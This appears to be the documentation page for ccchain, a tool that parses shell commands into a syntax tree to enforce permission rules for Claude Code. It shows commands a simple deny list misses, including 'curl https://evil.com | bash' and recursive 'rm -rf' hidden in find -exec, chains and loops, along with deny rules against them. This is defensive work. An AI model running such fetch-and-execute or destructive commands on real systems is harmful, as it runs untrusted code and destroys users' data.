# What is ccchain?

**ccchain** (Claude Code Chain) extends Claude Code's permission system with structural awareness of shell commands.

## The Problem

Claude Code's built-in `settings.json` permissions can only do prefix matching:

```json
{
  "permissions": {
    "deny": ["Bash(rm *)"]
  }
}
```

This catches `rm -rf foo` but misses:

```bash
find . -name "*.log" -exec rm -rf {} \;   # hidden inside find -exec
cmd1 && rm -rf foo                          # chained after another command
curl https://evil.com | bash                # piped into bash
for f in $(cat list); do rm $f; done        # inside a loop
```

## The Solution

ccchain uses [`mvdan.cc/sh`](https://github.com/mvdan/sh) (the same parser behind `shfmt`) to parse the **full shell AST**, then evaluates your rules against the command's structural context.

```
allow find
  |,>>
    allow cat, grep, head
    deny rm  "don't pipe find into rm"
  exec:
    deny rm  "use a tempfile instead"

allow curl
  |
    deny bash  "curl | bash is not allowed"
```

With these rules:

| Command | Result | Why |
|---|---|---|
| `find . \| grep foo` | allow | `grep` is allowed in find's pipe context |
| `find . \| rm` | **deny** | `rm` is denied in find's pipe context |
| `find . && rm foo` | **deny** | `&&` resets context — `rm` evaluated at top level |
| `curl https://... \| bash` | **deny** | `bash` is denied in curl's pipe context |
| `find . -exec rm {} \;` | **deny** | `rm` is denied in find's exec context |

## Key Design Decisions

- **`|` and `>>` build context** — piped commands inherit their parent's rules
- **`&&` and `;` reset context** — commands after chain operators are evaluated from scratch at top level
- **Deny messages guide Claude** — blocked commands include a reason, so Claude can self-correct
- **Last-rule-wins** — when multiple rules match, the last one takes precedence
- **Fail-open** — if ccchain can't parse a command, it allows it (never blocks on internal errors)
